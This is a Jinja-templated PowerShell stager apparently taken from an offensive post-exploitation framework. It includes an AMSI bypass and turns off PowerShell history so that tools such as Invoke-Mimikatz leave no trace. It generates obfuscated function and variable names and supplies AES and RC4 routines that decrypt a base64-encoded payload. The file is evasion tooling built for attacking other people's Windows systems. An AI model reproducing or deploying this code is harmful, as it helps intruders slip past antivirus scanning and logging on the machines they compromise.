{#- At this point, we assume AMSI is disabled -#}
{#- Load process-specific AMSI bypass -#}

{%- include "powershell/amsi/process.ps1" %}

{# Disable Readline Histfile; things like 'Invoke-Mimikatz' in it might trigger #}
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}

$GLOBAL_KEY = ${{symbol_name("global_key")}}
$WebClient = ${{symbol_name("web_client")}}

function Encrypt-AES {
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    $aesManaged.Key = [byte[]]$key[0..15]

    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($buffer, 0, $buffer.Length);
    [byte[]] $result = $aesManaged.IV + $encryptedData

    {# The following method does not exist in PS2 #}
    try{$aesManaged.Dispose()}catch{}
    $result
}

function Decrypt-AES {
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    $aesManaged.Key = [byte[]]$key[0..15]
    $aesManaged.IV = [byte[]]$buffer[0..15]

    $decryptor = $aesManaged.CreateDecryptor()
    $result = $decryptor.TransformFinalBlock($buffer, 16, $buffer.Length-16);

    {# The following method does not exist in PS2 #}
    try{$aesManaged.Dispose()}catch{}
    $result
}

{% if slow_encryption %}
{# Redefine xor for speed #}
function {{symbol_name("xor")}} {
    param (${{symbol_name('A')}}, ${{symbol_name('B')}});
    return [Byte](${{symbol_name('A')}} -bxor ${{symbol_name('B')}})
}

function Decrypt-RC4_ {
    {{symbol_name("Decrypt-RC4")}} $args[0] $args[1]
}
{% endif %}

function {{symbol_name("Unpack")}} {
    param ($buffer)

    $Result = [System.Convert]::FromBase64String($buffer)
    {% if slow_encryption %}
        {{'Write-Debug "Encryption mode: slow (RC4)"'|debug}}
        $Result = Decrypt-RC4_ $Result $GLOBAL_KEY
    {% else %}
        {{'Write-Debug "Encryption mode: fast (AES)"'|debug}}
        $Result = Decrypt-AES $Result $GLOBAL_KEY
    {% endif %}
    if (-not $Result) {return}
    $Result = [System.Text.Encoding]::UTF8.GetString($Result)
    $Result
}
